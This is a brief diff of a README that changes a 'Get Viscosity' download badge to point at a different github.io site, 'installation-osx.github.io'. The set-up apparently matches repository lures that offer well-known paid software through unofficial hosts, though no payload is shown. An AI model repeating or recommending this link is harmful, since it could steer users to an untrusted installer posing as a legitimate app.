@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-  <a href="https://tembilamusion.github.io/.github/Viscosity">  
+  <a href="https://installation-osx.github.io/.github/Viscosity">  
     <img src="https://img.shields.io/badge/⬇️_Get_Viscosity-007ACC?style=for-the-badge&logo=apple&logoColor=white" alt="Get Viscosity">  
   </a>  
 </div>  
